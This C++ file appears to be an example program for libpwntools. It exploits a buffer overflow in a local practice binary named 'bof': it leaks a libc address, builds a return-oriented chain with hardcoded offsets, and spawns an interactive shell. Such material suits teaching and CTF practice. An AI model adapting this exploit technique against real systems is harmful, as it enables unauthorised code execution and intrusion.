/*
BSD 2-Clause License

Copyright (c) 2021, libpwntools
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include <string>
#include <iostream>
#include <pwntools>

int main(void) {
    Process io("./bof");
    std::string payload;
    payload.resize(0x18);
    io.recvline();

    payload += pack::p64(0x401263);
    payload += pack::p64(0x404018);
    payload += pack::p64(0x401060);
    payload += pack::p64(0x401176);

    io.sendline(payload);
    std::string _leak = io.recv(6);
    _leak.resize(8);
    uint64_t leak = pack::u64(_leak);

    printf("puts leak: %p\n", (void *)leak);
    leak -= 0x875a0;
    printf("libc leak: %p\n", (void *)leak);
    io.recvline();
    
    payload.resize(0x18);
    payload += pack::p64(0x401264);
    payload += pack::p64(0x401263);
    payload += pack::p64(leak + 0x1b75aa);
    payload += pack::p64(leak + 0x55410);
    io.sendline(payload);

    io.interactive();
}
